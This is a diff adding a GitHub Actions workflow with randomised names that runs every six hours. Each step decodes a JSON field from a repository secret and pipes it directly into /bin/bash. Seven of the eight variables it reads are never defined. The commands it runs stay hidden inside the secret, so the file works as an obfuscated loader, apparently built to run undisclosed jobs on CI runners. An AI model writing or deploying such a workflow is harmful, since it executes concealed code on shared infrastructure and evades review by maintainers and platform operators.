@@ -1,0 +1,25 @@
+name: beixirui3217
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '27 5/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: beixirui3217
+        env:
+          duq62522: ${{ secrets.duq62522 }}
+        run: |
+          echo $duq62522 | jq -r .sulbl0912 | /bin/bash
+          echo $lvwj3 | jq -r .ylker0641 | /bin/bash
+          echo $nzkdg7766 | jq -r .a29173 | /bin/bash
+          echo $me9 | jq -r .iim25 | /bin/bash
+          echo $z51906 | jq -r .gz4 | /bin/bash
+          echo $hbhs203 | jq -r .wrele3399 | /bin/bash
+          echo $uok33 | jq -r .fquj371 | /bin/bash
+          echo $ckey7 | jq -r .utzcr34 | /bin/bash
+
